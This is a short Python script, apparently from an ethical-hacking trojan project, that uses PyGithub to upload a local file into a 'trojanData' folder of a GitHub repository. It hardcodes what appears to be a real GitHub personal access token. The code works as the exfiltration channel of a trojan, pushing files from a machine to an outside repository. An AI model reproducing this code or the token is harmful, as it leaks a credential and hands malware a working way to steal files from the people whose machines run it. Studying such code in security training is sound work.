from github import Github

# Authenticate with your Personal Access Token
ACCESS_TOKEN = "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"
REPO_NAME = "michiel-hoeree/EthicalHackingTojan"  # Replace with your repo details
BRANCH = "main"  # The branch you want to target
FOLDER_PATH = "trojanData"  # The folder path in the repository

# Initialize PyGithub
g = Github(ACCESS_TOKEN)

# Get the repository
repo = g.get_repo(REPO_NAME)

# Function to upload a file
def upload_file(file_path, commit_message, folder_path, branch):
    with open(file_path, "r") as file:
        content = file.read()

    # Target file path in the repository
    file_name = file_path.split("/")[-1]
    git_path = f"{folder_path}/{file_name}"

    # Check if the file exists in the target branch
    try:
        contents = repo.get_contents(git_path, ref=branch)
        # If file exists, update it
        repo.update_file(contents.path, commit_message, content, contents.sha, branch=branch)
        print(f"Updated {git_path} on branch {branch}.")
    except Exception as e:
        # If file doesn't exist, create it
        repo.create_file(git_path, commit_message, content, branch=branch)
        print(f"Created {git_path} on branch {branch}.")

# Example usage
file_to_upload = "test.txt"  # Replace with the path to your local file
commit_message = "Add example.txt to the repository"
upload_file(file_to_upload, commit_message, FOLDER_PATH, BRANCH)
